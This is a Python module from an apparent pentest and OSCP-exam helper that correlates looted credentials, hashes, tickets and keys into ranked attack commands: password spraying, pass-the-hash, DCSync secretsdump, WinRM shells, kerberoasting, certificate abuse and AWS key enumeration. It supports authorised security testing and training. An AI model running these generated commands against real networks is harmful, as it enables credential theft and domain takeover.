"""correlate.py - the loot CORRELATION / ATTACK-CHAINING engine.

Runs AFTER all analyzers + ingest. It joins what secrethound found (creds,
hashes, keys, GPP, kerberos artifacts) with the ingested evidence (nmap
services, BloodHound facts, validated creds, host inventory) and emits ranked,
EXAM-LEGAL next actions under category ATTACK CHAINS.

Compliance is enforced from ONE source of truth: every emitted command is linted
against analyzers.compliance (no second allowlist lives here). Spoofing/relay
steps are confined to lab_only chains, capped at MEDIUM, never a top action, and
always carry the [LAB-ONLY] tag.
"""
import re
from analyzers import compliance, filters
from analyzers.ingest.evidence import Evidence

LAB = compliance.LAB_ONLY_TAG

# ── detail-prefix parsers (the entity extractors) ──
_RX = {
    "credpair": re.compile(r'USER=(\S+)\s+PASS=(\S+)'),
    "cracked": re.compile(r"CRACKED .*?=\s*'([^']+)'"),
    "default_nt": re.compile(r"NTLM \(DEFAULT = '([^']+)'\):\s*([a-f0-9]{32})", re.I),
    "default_generic": re.compile(r"\(DEFAULT = '([^']+)'\)"),
    "nt": re.compile(r'NTLM(?: hash)?(?: \(NT\))?:?\s*([a-f0-9]{32})', re.I),
    "notes_pass": re.compile(r'notes(?:\s*table)?:\s*(?:PASS=|\S+?:)([^\s(]+)'),
    "assigned": re.compile(r'^[^=:]{1,40}[:=]\s*["\']?([^"\'\s#;]{4,60})'),
}


class Chain:
    __slots__ = ("rule", "label", "summary", "crit", "conf", "ready", "prox",
                 "commands", "lab_only", "src", "line", "count")

    def __init__(self, rule, label, summary, crit, conf, ready, prox,
                 commands, lab_only=False, src="?", line=None, count=1):
        self.rule, self.label, self.summary = rule, label, summary
        self.crit, self.conf, self.ready, self.prox = crit, conf, ready, prox
        self.commands, self.lab_only = commands, lab_only
        self.src, self.line = src, line
        self.count = count          # how many findings this one chain represents

    @property
    def score(self):
        return round(self.crit * self.conf * self.prox * self.ready, 1)


class _Ents:
    def __init__(self):
        # iter-14: value is now LIST of (user_display, source, line) so a
        # second occurrence of the same (user, pw) accumulates evidence
        # instead of silently dropping the earlier source/line.
        self.creds = {}        # (user_lc, pw) -> [(user_display, source, line), ...]
        self.users = set()
        self.nt = {}           # hash -> [(user, source, line), ...]  iter-14: list
        self.defaults = {}     # label -> [(source, line), ...]       iter-14: dict-of-list
        self.kerberoastable = set()
        self.asreproastable = set()
        self.has_tgs = self.has_asrep = self.has_shadow = False
        self.has_gpp = self.has_pkey = self.has_cert = self.has_ccache = False
        self.shadow_src = self.gpp_src = self.pkey_src = self.cert_src = None
        self.ccache_src = self.tgs_src = self.asrep_src = None
        self.sam_dirs = {}     # dir -> set(hive names)


def _add_cred(e, user, pw, src, line):
    pw = (pw or "").strip().strip("'\"")
    if not pw or len(pw) < 3:
        return
    # iter-14: append (don't overwrite) so multiple sources for the same
    # cred accumulate evidence. The R1 spray chain only needs ONE
    # (src,line) anchor, but losing the others poisons attribution.
    key = ((user or "").lower(), pw)
    e.creds.setdefault(key, []).append((user or "<user>", src, line))
    if user:
        e.users.add(user)


def _add_default(e, label, src, line=None):
    """iter-14: track default cred as dict-of-list so 'admin/admin' seen
    in multiple files dedups to one chain but retains all evidence."""
    if not label:
        return
    e.defaults.setdefault(label, []).append((src, line))


def _add_nt(e, hash_val, user, src, line):
    """iter-14: append (don't overwrite) so a hash seen via SAM + secretsdump
    + LSA accumulates all evidence; the R7 chain count reflects the truth."""
    if not hash_val:
        return
    e.nt.setdefault(hash_val.lower(), []).append((user, src, line))


def _entities(report, store):
    e = _Ents()
    import os
    for f in report.findings:
        d, cat, src, ln = f["detail"], f["category"], f["file"], f["line"]
        if cat == "CRED PAIRS":
            m = _RX["credpair"].search(d)
            if m:
                _add_cred(e, m.group(1), m.group(2), src, ln)
            m = _RX["cracked"].search(d)
            if m:
                _add_cred(e, "", m.group(1), src, ln)
            mn = _RX["notes_pass"].search(d)
            if mn:
                _add_cred(e, "", mn.group(1), src, ln)
            md = _RX["default_nt"].search(d)
            if md:
                _add_default(e, md.group(1), src, ln); _add_cred(e, "", md.group(1), src, ln)
        if cat == "PASSWORD HASHES":
            mdn = _RX["default_nt"].search(d)
            if mdn:
                _add_default(e, mdn.group(1), src, ln); _add_cred(e, "", mdn.group(1), src, ln)
            elif "NTLM" in d and "blank" not in d.lower():
                # user-bound form "NTLM (NT) <user>: <hash>" (from pwdump rows)
                mb = re.search(r'NTLM \(NT\)\s*([^\s:]+)\s*:\s*([a-f0-9]{32})', d)
                if mb and not filters.is_blank_hash(mb.group(2)):
                    _add_nt(e, mb.group(2), mb.group(1), src, ln)
                elif not mb:
                    mh = re.search(r'\b([a-f0-9]{32})\b', d)
                    if mh and not filters.is_blank_hash(mh.group(1)):
                        _add_nt(e, mh.group(1), None, src, ln)
            if d.startswith(("sha512crypt", "md5crypt", "sha256crypt", "bcrypt", "yescrypt")):
                e.has_shadow = True; e.shadow_src = e.shadow_src or (src, ln)
            if d.startswith("Kerberoast TGS"):
                e.has_tgs = True; e.tgs_src = e.tgs_src or (src, ln)
            if d.startswith("AS-REP roast"):
                e.has_asrep = True; e.asrep_src = e.asrep_src or (src, ln)
        if "DEFAULT = '" in d and cat != "PASSWORD HASHES":
            mdg = _RX["default_generic"].search(d)
            if mdg:
                _add_default(e, mdg.group(1), src, ln); _add_cred(e, "", mdg.group(1), src, ln)
        if cat == "GPP cpassword":
            e.has_gpp = True; e.gpp_src = e.gpp_src or (src, ln)
        if cat == "PRIVATE KEYS":
            e.has_pkey = True; e.pkey_src = e.pkey_src or (src, ln)
        if cat == "INTERESTING FILES":
            low = (src or "").lower()
            if low.endswith((".pfx", ".p12")):
                e.has_cert = True; e.cert_src = e.cert_src or (src, ln)
            if low.endswith((".kirbi", ".ccache")) or "krb5cc" in low:
                e.has_ccache = True; e.ccache_src = e.ccache_src or (src, ln)
            base = os.path.basename(low)
            if base in ("sam", "system", "security"):
                e.sam_dirs.setdefault(os.path.dirname(src), set()).add(base)
    # merge ingested evidence
    for ev in store.items:
        if ev.kind == "plaintext" and ev.plaintext:
            _add_cred(e, ev.user, ev.plaintext, ev.source, ev.line)
        elif ev.kind == "cred" and ev.cred:
            _add_cred(e, ev.user, ev.cred, ev.source, ev.line)
        elif ev.kind == "hash" and ev.hash and not filters.is_blank_hash(ev.hash):
            _add_nt(e, ev.hash, ev.user, ev.source, ev.line)
        if ev.user:
            e.users.add(ev.user)
        if ev.fact == "kerberoastable":
            e.kerberoastable.add(ev.user)
        elif ev.fact == "asreproastable":
            e.asreproastable.add(ev.user)
    return e


def _userlist(e):
    return "users.txt" if len({u.lower() for u in e.users}) > 1 else None


def _machine(src, root):
    """top-level loot dir (per-box scope), e.g. 'forest' from htb/forest/notes."""
    import os
    if not src or src.startswith(("<", "bloodhound")):
        return ""
    try:
        rel = os.path.relpath(src, root)
    except ValueError:
        rel = src
    parts = rel.split(os.sep)
    return parts[0] if parts and parts[0] not in (".", "..") else ""


def run(report, store, ui=None):
    import os
    e = _entities(report, store)
    root = getattr(report, "root", ".")

    # per-machine service / DC maps (so a cred on box A never chains to box B)
    mach_svc, mach_dc = {}, {}
    for ev in store.by_kind("service"):
        if ev.host and ev.service:
            mach_svc.setdefault(_machine(ev.source, root), {}).setdefault(ev.service, ev.host)
    global_dc = ""
    for x in store.by_kind("host"):
        if x.fact == "dc" and x.host:
            mach_dc.setdefault(_machine(x.source, root), x.host)
            global_dc = global_dc or x.host

    def svc_on(mach, svc):
        return mach_svc.get(mach, {}).get(svc)

    def dc_for(mach):
        return mach_dc.get(mach) or svc_on(mach, "smb") or global_dc or "<DC-IP>"

    chains = []
    ul = _userlist(e)

    # ── plaintext creds: spray + (only same-machine) service shells ──
    # iter-14: e.creds is now dict-of-list. iter-15: pick the BEST occurrence
    # (real user display + deterministic src path) so attribution stays stable
    # across runs and points at the most informative source.
    for (ulc, pw), occurrences in e.creds.items():
        def _cred_quality(o):
            d, s, l = o
            return (d == "<user>", s or "", l or 0)
        best = sorted(occurrences, key=_cred_quality)[0]
        disp, src, ln = best
        cred_count = len(occurrences)
        mach = _machine(src, root)
        smb = svc_on(mach, "smb") or dc_for(mach)
        utoken = ul or f"'{disp}'"
        # iter-16: spray safety gating
        #   - lockout-threshold guardrail when known
        #   - -k flag only when user-cred carries kerberos context (FQDN
        #     username or netexec_db kerberos hit); blind addition causes
        #     "kerberos config missing" errors when $KRB5CCNAME is unset.
        #   - DCSync caveat moved to its own command (was an inline #-comment
        #     that the operator could miss)
        lockout = getattr(store, "lockout_threshold", None)
        lockout_note = ""
        if lockout and lockout > 0:
            lockout_note = (f"   # CAUTION: domain lockout threshold={lockout}; "
                            f"do NOT spray more attempts than {lockout - 1} per user")
        has_krb_ctx = "." in (disp or "") or "@" in (disp or "")
        krb_flag = " -k" if (has_krb_ctx and utoken != "users.txt") else ""
        chains.append(Chain("R1", "spray", f"reuse {disp}:{pw} across hosts",
            crit=8, conf=0.8, ready=1.5, prox=_prox(store, smb),
            commands=[f"netexec smb {smb} -u {utoken} -p '{pw}' --continue-on-success{krb_flag}{lockout_note}",
                      f"# AFTER confirming Pwn3d! on {smb}, then dcsync (gates the secretsdump):",
                      f"impacket-secretsdump '{disp}':'{pw}'@{smb} -just-dc"],
            src=src, line=ln))
        wh = svc_on(mach, "winrm")
        if wh:
            chains.append(Chain("R3", "winrm shell", f"{disp} -> WinRM {wh}",
                crit=7, conf=0.8, ready=1.5, prox=_prox(store, wh),
                commands=[f"evil-winrm -i {wh} -u '{disp}' -p '{pw}'"], src=src, line=ln))
        mh = svc_on(mach, "mssql")
        if mh:
            chains.append(Chain("R4", "mssql", f"{disp} -> MSSQL {mh}",
                crit=6, conf=0.7, ready=1.5, prox=_prox(store, mh),
                commands=[f"impacket-mssqlclient '{disp}':'{pw}'@{mh} -windows-auth"], src=src, line=ln))
        sh = svc_on(mach, "ssh")
        if sh:
            # iter-13: SSH password login is more reliable than MSSQL
            # -windows-auth (which depends on a successful AD mapping).
            chains.append(Chain("R5", "ssh", f"{disp} -> SSH {sh}",
                crit=6, conf=0.75, ready=1.5, prox=_prox(store, sh),
                commands=[f"ssh '{disp}'@{sh}    # password: {pw}"], src=src, line=ln))

    # ── NT hashes: AGGREGATE per target (one rolled-up PtH chain, not 1/hash) ──
    # iter-13 false-confidence fix: tag hash origin (local-SAM vs domain) so
    # R7's command can include --local-auth when the hash came from a SAM hive
    # and we're targeting the originating host (not the DC).
    def _hash_is_local_sam(src_path):
        """Heuristic: hash extracted from SAM/SYSTEM (LOCAL secretsdump) is
        a LOCAL account NT - PtH against the same host needs --local-auth.
        Domain hashes (from ntds.dit / DCSync) work against the DC without it."""
        plow = (src_path or "").lower()
        return any(k in plow for k in
                   ("/sam", "/system", "sam+system", "sam_system",
                    "lsadump::sam", "local secretsdump"))

    by_target = {}
    # iter-15: pick the BEST occurrence as the anchor (not just the first).
    # Quality rank: (a) prefer an occurrence with a real username; (b) prefer
    # the one whose machine resolves to a DC target; (c) tiebreak by sorting
    # source path for determinism across runs / filesystems.
    def _hash_quality(occ):
        user, src, line = occ
        mach = _machine(src, root)
        has_user = bool(user)
        tgt_svc = svc_on(mach, "smb")
        is_dc = bool(tgt_svc) and (_prox(store, tgt_svc) >= 1.0)
        # lower is better (used as sort key)
        return (not has_user, not is_dc, src or "", line or 0)

    for h, occurrences in e.nt.items():
        # pick best occurrence for src/line anchor
        best = sorted(occurrences, key=_hash_quality)[0]
        huser, src, ln = best
        mach = _machine(src, root)
        tgt = svc_on(mach, "smb") or dc_for(mach)
        by_target.setdefault(tgt, []).append((h, huser, src, ln))
    for tgt, items in by_target.items():
        # iter-15: also rank items inside a target group so the printed h0/u0
        # picks the quality occurrence, not the dict-iteration first.
        items.sort(key=lambda x: (not x[1], x[2] or "", x[3] or 0))
        h0, u0, src0, ln0 = items[0]
        u = u0 or "<user>"
        n = len(items)
        more = f"   # +{n - 1} more NT hashes here - loop the rest (see PASSWORD HASHES)" if n > 1 else ""
        # iter-13: R7 prox = best reachable target so a DC anywhere in the
        # group lifts the parent action above its R8 winrm child.
        best_prox = _prox(store, tgt)
        for _h, _u, _s, _l in items:
            for svc in ("smb", "winrm"):
                h_ = svc_on(_machine(_s, root), svc)
                if h_:
                    best_prox = max(best_prox, _prox(store, h_))
        # iter-13: if the hash came from a SAM hive, the cred is LOCAL.
        # PtH against the DC is the wrong move; PtH against the originating
        # host with --local-auth is the right one. Emit two distinct chains.
        local_origin = any(_hash_is_local_sam(s) for _h, _u, s, _l in items)
        if local_origin:
            cmd_pth = (f"netexec smb {tgt} -u '{u}' -H {h0} --local-auth{more}    "
                       f"# LOCAL SAM hash - target the ORIGINATING host, not the DC")
        else:
            cmd_pth = f"netexec smb {tgt} -u '{u}' -H {h0}{more}"
        chains.append(Chain("R7", "pass-the-hash", f"PtH -> {tgt}" + (f"  x{n} hashes" if n > 1 else f" ({u})"),
            crit=10, conf=0.85, ready=1.5, prox=best_prox,
            commands=[cmd_pth,
                      (f"impacket-secretsdump -hashes :{h0} <DOMAIN>/'{u}'@{tgt} -just-dc   # if (Pwn3d!)"
                       if not local_origin else
                       f"# DCSync NOT available with LOCAL SAM hashes; gather domain creds first")],
            src=src0, line=ln0, count=n))
        # winrm PtH only when that machine actually exposes winrm
        wh = None
        for _h, _u, _s, _l in items:
            wh = svc_on(_machine(_s, root), "winrm")
            if wh:
                break
        if wh:
            # iter-16: was f-string-then-concat; the {wh} in the NOTE half
            # was a literal '{wh}' instead of the interpolated value.
            note = (f"    # NOTE: local-SAM hash; ensure {wh} == originating host"
                    if local_origin else "")
            cmd_wh = f"evil-winrm -i {wh} -u '{u}' -H {h0}{note}"
            chains.append(Chain("R8", "PtH winrm", f"PtH -> WinRM {wh}",
                crit=8, conf=0.8, ready=1.5, prox=_prox(store, wh),
                commands=[cmd_wh], src=src0, line=ln0, count=n))

    def host(svc, fallback="<target>"):     # legacy helper used by rules below
        for m in mach_svc:
            if svc in mach_svc[m]:
                return mach_svc[m][svc]
        return fallback

    def dc(fallback="<DC-IP>"):
        return global_dc or fallback

    # iter-12 composite: AWS access key + secret in the same file within
    # 30 lines = an AWS auth-complete pair. Emit one CRITICAL chain with the
    # ready-to-paste `aws sts get-caller-identity` invocation; the per-rule
    # 'AWS access key' / 'AWS secret' findings remain in their categories.
    aws_akids, aws_saks = {}, {}
    for f in report.findings:
        det = f.get("detail") or ""
        path = f.get("file") or ""
        line = f.get("line") or 0
        if "AWS access key" in det:
            # detail format: "AWS access key: AKIA..."
            akid = det.split(":", 1)[-1].strip()
            aws_akids.setdefault(path, []).append((akid, line))
        elif "AWS secret" in det:
            sak = det.split(":", 1)[-1].strip()
            aws_saks.setdefault(path, []).append((sak, line))
    # iter-14: dedup R30 by akid across files - same access key in two files
    # should emit ONE chain, not two.
    seen_aws = set()
    for path, akids in aws_akids.items():
        for akid, akline in akids:
            if akid in seen_aws:
                continue
            for sak, sline in aws_saks.get(path, []):
                if abs((sline or 0) - (akline or 0)) > 30:
                    continue
                seen_aws.add(akid)
                # iter-13: AWS keys often rotated / disabled; PtH on a real NT
                # hash is more reliable. Drop prox 0.8 -> 0.7 (~8.51) so PtH on
                # non-DC SMB (8.93) wins by default. AWS is also mostly out-of-
                # scope for the OSCP+ AD exam path - keep findable but never
                # poison the top of the queue when AD context is rich.
                # iter-16: AKIA = long-lived (no session token), ASIA = STS
                # temp (REQUIRES session token). The IMDS rule captures the
                # token; if available, paste it from the IMDS finding's
                # 'AWS Session Token' line. Add the export line as a hint.
                is_sts = akid.startswith("ASIA")
                cmds = [
                    f"export AWS_ACCESS_KEY_ID={akid}",
                    f"export AWS_SECRET_ACCESS_KEY={sak}",
                ]
                if is_sts:
                    cmds.append("export AWS_SESSION_TOKEN=<paste from IMDS finding 'Session Token'>"
                                "    # REQUIRED for ASIA keys, optional for AKIA")
                cmds += [
                    "aws sts get-caller-identity",
                    "aws s3 ls; aws iam list-attached-user-policies --user-name $(aws sts get-caller-identity --query Arn --output text | cut -d/ -f2)",
                ]
                chains.append(Chain("R30", "AWS auth-complete",
                    f"AWS access+secret pair: {akid} / {sak[:8]}...",
                    crit=9, conf=0.9, ready=1.5, prox=0.7,        # score 8.51
                    commands=cmds, src=path, line=akline))
                break  # one pair per akid

    # default creds -> log in directly. iter-13: demoted from crit=8/conf=1.0
    # because it's a GUESS, not an artifact. iter-14: e.defaults is now a
    # dict-of-list; dedup by label so 'admin/admin' seen in 3 files emits
    # ONE R24 chain (with count=3) instead of three separate ones.
    for label, occurrences in e.defaults.items():
        # iter-15: sort by (src, line) to pick the deterministic anchor and
        # PRESERVE the line (was dropped). Operator can now navigate to it.
        best = sorted(occurrences, key=lambda x: (x[0] or "", x[1] or 0))[0]
        src0, ln0 = best
        chains.append(Chain("R24", "default cred", f"default password '{label}' in use",
            crit=6, conf=0.7, ready=1.3, prox=0.8,        # score 4.37
            commands=[f"netexec smb {dc()} -u '<user>' -p '{label}'"],
            src=src0, line=ln0, count=len(occurrences)))

    # kerberoast. iter-13: prox honors DC presence so a known DC lifts the score
    for u in e.kerberoastable:
        chains.append(Chain("R9", "kerberoast", f"kerberoastable: {u}",
            crit=6, conf=0.8, ready=0.7, prox=max(0.7, _prox(store, dc())),
            commands=[f"impacket-GetUserSPNs -request -dc-ip {dc()} <DOMAIN>/<user>:<pass>",
                      "hashcat -m 13100 tgs.txt rockyou.txt -r best64.rule"],
            src="bloodhound"))
    if e.has_tgs:
        s, l = e.tgs_src
        chains.append(Chain("R10", "crack TGS", "Kerberoast TGS hash present",
            crit=4, conf=0.8, ready=0.7, prox=0.6,
            commands=["hashcat -m 13100 tgs.txt rockyou.txt -r best64.rule"], src=s, line=l))
    # AS-REP. iter-13: prox honors DC presence
    for u in e.asreproastable:
        chains.append(Chain("R11", "AS-REP roast", f"AS-REP-able: {u}",
            crit=5, conf=0.8, ready=0.7, prox=max(0.7, _prox(store, dc())),
            commands=[f"impacket-GetNPUsers <DOMAIN>/ -usersfile {ul or 'users.txt'} -dc-ip {dc()} -no-pass",
                      "hashcat -m 18200 asrep.txt rockyou.txt"], src="bloodhound"))
    if e.has_asrep:
        s, l = e.asrep_src
        chains.append(Chain("R12", "crack AS-REP", "AS-REP hash present",
            crit=4, conf=0.8, ready=0.7, prox=0.6,
            commands=["hashcat -m 18200 asrep.txt rockyou.txt"], src=s, line=l))

    # GPP cpassword. iter-13: conf=1.0 was over-confident - the DECRYPTION is
    # deterministic (published MS AES key) but the recovered cred validity is
    # not (MS14-025 prompted mass rotations of GPP-pushed local-admin pws).
    if e.has_gpp:
        s, l = e.gpp_src
        chains.append(Chain("R13", "gpp-decrypt", "GPP cpassword (public AES key)",
            crit=7, conf=0.9, ready=1.5, prox=0.85,        # score 8.04
            commands=["gpp-decrypt '<cpassword-value>'",
                      f"netexec smb {dc()} -u '<user>' -p '<decrypted>' --local-auth --continue-on-success"],
            src=s, line=l))
    # private key
    if e.has_pkey:
        s, l = e.pkey_src
        sh = host("ssh")
        chains.append(Chain("R17", "ssh key", "private key recovered",
            crit=6, conf=0.7, ready=1.3, prox=_prox(store, sh),
            commands=[f"chmod 600 <keyfile>; ssh -i <keyfile> <user>@{sh}",
                      "if ENCRYPTED: ssh2john <keyfile> > k; hashcat -m 22921 k rockyou.txt"],
            src=s, line=l))
    # cert / pfx -> certipy -> PtH. iter-13: ADCS PKINIT is a one-command
    # paste (certipy auth -pfx); under-rated vs GPP/PtH despite same effort.
    # iter-16: previous command never passed -password, so Certipy halted
    # at the PFX-unlock prompt. Add the placeholder so the operator knows
    # to populate it from the captured 'PFX cert password' finding (R7
    # secondary or keyword.py PFX rule).
    if e.has_cert:
        s, l = e.cert_src
        chains.append(Chain("R16", "AD CS cert", "PKCS#12 cert/key (certipy -> NT hash/TGT)",
            crit=8, conf=0.8, ready=1.4, prox=0.85,        # score 7.62
            commands=[f"certipy auth -pfx <file.pfx> -password '<pfx-password-if-set>' -dc-ip {dc()}",
                      "then PtH the recovered NT hash (see R7)"], src=s, line=l))
    # ccache / kirbi. iter-16: removed literal '-FQDN' suffix on dc() that
    # produced an unresolvable hostname '10.10.10.5-FQDN'. Kerberos requires
    # the DC's actual FQDN (the SPN in the ticket), so we tell the operator
    # to substitute - we cannot resolve IP -> FQDN passively.
    if e.has_ccache:
        s, l = e.ccache_src
        chains.append(Chain("R26", "pass-the-ticket", "Kerberos ticket present",
            crit=6, conf=0.8, ready=1.4, prox=0.8,
            commands=[f"export KRB5CCNAME=<ticket.ccache>; "
                      f"impacket-secretsdump -k -no-pass <DOMAIN>/<user>@<DC-FQDN>   "
                      f"# Kerberos: hostname MUST be the DC FQDN (SPN in ticket), not the IP {dc()}"],
            src=s, line=l))
    # shadow
    if e.has_shadow:
        s, l = e.shadow_src
        chains.append(Chain("R21", "crack shadow", "Linux shadow hash present",
            crit=5, conf=0.8, ready=0.7, prox=0.6,
            commands=["unshadow passwd shadow > u; hashcat -m 1800 u rockyou.txt"], src=s, line=l))
    # SAM/SYSTEM/SECURITY triad in one dir -> local secretsdump (no network).
    # iter-13: conf=1.0 was 'command will succeed', but conf encodes 'likelihood
    # of access'. SAM gives LOCAL hashes only - useful where the originating
    # host is reachable; useless against the DC without --local-auth.
    for d, hives in e.sam_dirs.items():
        if {"sam", "system"} <= hives:
            chains.append(Chain("R3T", "dump SAM", "SAM+SYSTEM -> local NT hashes (PtH against ORIGINATING host with --local-auth, NOT the DC)",
                crit=7, conf=0.9, ready=1.5, prox=0.7,        # score 6.62
                commands=["impacket-secretsdump -sam SAM -system SYSTEM" +
                          (" -security SECURITY" if "security" in hives else "") + " LOCAL"],
                src=os.path.join(d, "SAM")))

    # ── dedup identical chains across files (keep best score, sum counts) ──
    by_key = {}
    for c in chains:
        k = (c.rule, c.summary)
        if k in by_key:
            by_key[k].count += c.count
        else:
            by_key[k] = c
    chains = list(by_key.values())

    # ── compliance gate: tag lab-only, drop anything non-compliant ──
    clean = []
    for c in chains:
        cmds = []
        ok = True
        for cmd in c.commands:
            if c.lab_only and LAB not in cmd:
                cmd = cmd + "  " + LAB
            legal, _ = compliance.lint_command(cmd, tagged=c.lab_only)
            if not legal:
                ok = False
                break
            cmds.append(cmd)
        if ok and cmds:
            c.commands = cmds
            clean.append(c)
    chains = clean

    # iter-15: stable tiebreakers so identical-score chains never reorder
    # across runs. Order: score desc, ready desc, prox-known first, more
    # commands first, then rule_id + src + line + summary alphabetic.
    chains.sort(key=lambda c: (
        -c.score, -c.ready, c.prox is None, -len(c.commands),
        c.rule or "", c.src or "", c.line or 0, c.summary or ""))

    for c in chains:
        sev = "CRITICAL" if c.score >= 6 else "HIGH" if c.score >= 2 else "MEDIUM"
        if c.lab_only:
            sev = "MEDIUM"
        report.add(sev, "ATTACK CHAINS", c.src, c.line,
                   f"[{c.rule}] {c.summary}  (score {c.score})",
                   "  ;  ".join(c.commands))
    return chains


def _prox(store, host):
    """proximity 0.3-1.0: DC endpoints score highest."""
    if not host or host.startswith("<"):
        return 0.5
    for x in store.by_kind("host"):
        if x.host == host and x.fact == "dc":
            return 1.0
    return 0.7
